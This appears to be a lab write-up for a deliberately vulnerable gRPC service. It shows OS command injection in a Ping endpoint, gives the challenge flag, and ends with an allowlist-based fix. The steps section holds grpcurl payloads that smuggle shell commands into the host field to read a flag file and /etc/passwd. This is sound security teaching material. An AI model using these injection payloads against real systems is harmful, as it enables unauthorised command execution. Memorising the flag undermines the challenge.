# Challenge 07 — OS Command Injection

**Category:** Injection
**Difficulty:** 🟡 Medium
**Service:** `CommandService`
**Flag:** `FLAG{c0mm4nd_1nj3ct10n_v14_grpc_p1ng}`

---

## Background

OS Command Injection occurs when user input is passed to a shell command without sanitization. `subprocess.run(cmd, shell=True)` evaluates the entire string in a shell, so shell metacharacters like `;`, `&&`, `||`, `` ` ``, and `$()` let the attacker run arbitrary commands.

---

## Steps

```bash
TOKEN=$(grpcurl -plaintext localhost:50051 dvgrpc.AuthService/Login \
  -d '{"username":"alice","password":"alice123"}' | jq -r .token)

# Normal usage
grpcurl -plaintext -H "Authorization: Bearer $TOKEN" \
  localhost:50051 dvgrpc.CommandService/Ping \
  -d '{"host":"127.0.0.1","count":1}'

# Injection — semicolon
grpcurl -plaintext -H "Authorization: Bearer $TOKEN" \
  localhost:50051 dvgrpc.CommandService/Ping \
  -d '{"host":"127.0.0.1; cat /app/secret/cmd_flag.txt","count":1}'

# Injection — subshell
grpcurl -plaintext -H "Authorization: Bearer $TOKEN" \
  localhost:50051 dvgrpc.CommandService/Ping \
  -d '{"host":"$(cat /app/secret/cmd_flag.txt)","count":1}'

# Enumerate the system
grpcurl -plaintext -H "Authorization: Bearer $TOKEN" \
  localhost:50051 dvgrpc.CommandService/Ping \
  -d '{"host":"127.0.0.1 && id && cat /etc/passwd | head -5","count":1}'
```

---

## Fix

```python
import re
import subprocess

def Ping(self, request, context):
    # Allowlist validation
    if not re.match(r'^[a-zA-Z0-9.\-]+$', request.host):
        context.abort(grpc.StatusCode.INVALID_ARGUMENT, "Invalid hostname.")
        return
    count = max(1, min(request.count or 1, 5))
    # Pass as list — no shell interpolation
    result = subprocess.run(
        ["ping", "-c", str(count), request.host],
        capture_output=True, text=True, timeout=10
    )
```
